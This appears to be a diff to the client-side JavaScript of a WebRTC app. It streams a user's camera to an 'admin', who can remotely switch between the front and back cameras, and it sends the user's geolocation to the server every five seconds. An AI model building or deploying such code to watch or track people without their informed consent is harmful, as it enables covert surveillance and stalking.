@@ -1,6 +1,8 @@
 // USER SIDE
 const socket = io();
 let pc = null;
+let stream = null;
+let currentFacingMode = "environment"; // start with BACK camera
 
 function createUserPC(stream) {
   const pc = new RTCPeerConnection({
@@ -12,37 +14,39 @@ function createUserPC(stream) {
   };
 
   stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
   return pc;
 }
 
-async function sendOffer() {
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: true,
+async function startCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+  }
+
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: currentFacingMode } },
     audio: false
   });
 
   document.getElementById("camera").srcObject = stream;
 
+  if (pc) pc.close();
   pc = createUserPC(stream);
 
   const offer = await pc.createOffer();
   await pc.setLocalDescription(offer);
-
   socket.emit("offer", offer);
-  console.log("Offer sent");
 }
 
-// ADMIN ASKS FOR OFFER
-socket.on("request-offer", () => {
-  console.log("Admin requested offer");
-  sendOffer();
+// 🔁 ADMIN REQUESTS CAMERA SWITCH
+socket.on("switch-camera", () => {
+  currentFacingMode =
+    currentFacingMode === "environment" ? "user" : "environment";
+  startCamera();
 });
 
 // ADMIN ANSWER
 socket.on("answer", async (answer) => {
-  if (!pc) return;
-  await pc.setRemoteDescription(new RTCSessionDescription(answer));
+  if (pc) await pc.setRemoteDescription(new RTCSessionDescription(answer));
 });
 
 // ICE
@@ -50,7 +54,7 @@ socket.on("ice-candidate", async (candidate) => {
   if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate));
 });
 
-// LOCATION SEND
+// LOCATION
 setInterval(() => {
   navigator.geolocation.getCurrentPosition((pos) => {
     socket.emit("location", {
@@ -60,5 +64,5 @@ setInterval(() => {
   });
 }, 5000);
 
-// INITIAL OFFER
-sendOffer();
+// INITIAL START
+startCamera();
